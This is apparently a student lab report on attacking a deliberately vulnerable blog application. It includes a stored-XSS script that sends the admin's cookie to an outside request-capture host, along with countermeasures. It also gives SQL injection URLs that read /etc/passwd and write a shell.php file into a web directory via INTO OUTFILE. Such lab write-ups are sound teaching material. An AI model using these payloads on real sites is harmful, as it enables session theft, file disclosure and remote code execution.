# Report Lab 3 - Albin Skeppstedt Isak Söderlind

## Part 1 - XSS
We found that comments on blog posts does not have input sanitation against script tags, which made it possible to inject javascript into the frontend. The lab has a simulated admin that visits every page regularly. Meaning that when the admin loads the comment's section on a post, their client executes code that we insert.

We used this in combination with requestbin to export the cookie to another host. Leaving only the script as trace on the website after the exploit. Since it's not visably rendered, we believe that it meets the requirement about non visable traces.
### Script
```html
<script>
var request = new XMLHttpRequest();
request.open('GET', 'REQUESTBIN_URL' + '?c=' + document.cookie);
request.send();
</script>
```
### Countermeasures
Firstly, input sanitation could have prevented our attack. By escaping "<,>"-tags, they would be rendered as text instead of an executable script. This can be done server side, before the text is stored in the database.

Secondly, HTTPonly cookies would render the exploit impossible assuming that the admin is using an HTTPonly compliant web browser (Chromium, Firefox, Safari). It is a header value set on the cookie making compliant web browsers restrictive with cookies to javascript APIs. In our case, getting the session cookie with `document.cookie` wouldn't be possible.

Thridly, using an iframe for the comments div (`.secondary-navigation`) with the attribute `sandbox=allow-forms` would sandbox the comments. The sandbox attribute is deny by default, so only allowing forms would make scripts unable to run, as `allow-scripts` is a different permission that needs to be given to the iframe.

Fourthly, isolating user created content under a different origin where a seperate session key is used, or none at all. Such as having `blog.com` as a main site and `blogcontent.com` as the separate origin containing user content. In case a user uploads malicious code that steals session keys it would only get the session key for the user content part of the website (if any), not the part with the admin control.

## Part 2 - SQL injection
The vulnerability we found was on the functionality of editing posts. We found it by trying different URLs that have obvious database connectivity, like deleting posts, getting posts, posting comments. We tried by testing whether the end of the URL parses arithmetics on the id. Using `UNION` we can perform arbitrary SQL commands. Like for showing /etc/passwd: `localhost:8080/admin/edit.php?id=0%20UNION%20SELECT%201,2,load_file(%22/etc/passwd%22),4`.

The vulnerability stems from the lack of input sanitazation, the input should have been parameterized. Meaning that the SQL library in the web server's code constructs an SQL query with placeholder values for the input provided by the user. Instead of just placing raw text as a PHP string for the sql query.. 

When we have achieved an sql injection we can use that to look at relevant source code files. In the class `classes/post.php` that is used by the admin/post endpoint we find the function `find` that does not use input sanitation or input parammetrization for id. This is why we can execute arbitrary sql commands.
```php
 
  function find($id) {
    $result = mysql_query("SELECT * FROM posts where id=".$id);
    $row = mysql_fetch_assoc($result); 
    if (isset($row)){
      $post = new Post($row['id'],$row['title'],$row['text'],$row['published']);
    }
    return $post;
  
  }
```

We planted a malicious file giving us a shell by finding a directory which the mysql user has write access to. Finding this directory involved trial and error. By using the same technique we used earlier in order to be able to read files we can now try to write files using `into outfile` in different directories. An example URL for attempting to plant a file called `shell.php` in the directory of `/var/www/` looks like this. `localhost:8080/admin/edit.php?id=1%20union%20select%201,2,3,4%20into%20outfile%20%22/var/www/shell.php%22`. We tried this for `/var/www/`, `/var/www/classes` and `/var/www/css` of which the css directory worked. We now switch one of the columns, the `1,2,3,4` part, for malicious code that gives us a shell.

